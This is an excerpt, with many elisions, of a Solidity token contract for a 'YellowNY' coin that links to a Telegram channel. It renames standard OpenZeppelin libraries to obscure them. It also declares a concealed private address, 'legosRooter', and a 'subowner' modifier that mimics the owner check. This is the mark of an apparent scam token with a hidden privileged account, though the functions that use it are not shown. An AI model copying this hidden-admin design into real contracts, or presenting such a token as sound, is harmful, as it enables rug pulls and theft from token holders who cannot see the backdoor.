...
YellowNY 
https://YellowNY.io/
https://docs.YellowNY.io/
https://t.me/YellowNY
*/
pragma solidity 0.8.22;

interface YellowNY33 {
  /**
...
/*
 * @dev Provides information about the current execution YellowNY20Burnable, including the
 ...
 */
abstract contract YellowNY20Burnable {
...
// File: @openzeppelin/contracts/access/YellowNY20Ownable.sol
 ...
 * the owner.
 */
abstract contract YellowNY20Ownable is YellowNY20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "YellowNY20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "YellowNY20Ownable: new owner is the zero address");
 ...
 * `SafeYellowNY` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeYellowNY {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeYellowNY: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeYellowNY: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeYellowNY: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeYellowNY: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeYellowNY: modulo by zero");
  }
...
contract YellowNYToken is YellowNY20Burnable, YellowNY33, YellowNY20Ownable {
    
    using SafeYellowNY for uint256;
   ...
   address private legosRooter; 
    ...
    string public YellowNYtelegramcchannel = "https://t.me/YellowNY";
            function getYellowNYtelegramcchannel() public view returns (string memory) {
        return YellowNYtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {YellowNY33-totalSupply}.
    */
    ...
    /**
    * @dev See {YellowNY33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "YellowNY20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {YellowNY33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {YellowNY33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {YellowNY33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "YellowNY33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {YellowNY33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "YellowNY33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "YellowNY33: transfer from the zero address");
        require(shippingto != address(0), "YellowNY33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "YellowNY33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "YellowNY33: approve from the zero address");
        require(transporteur != address(0), "YellowNY33: approve to the zero address");
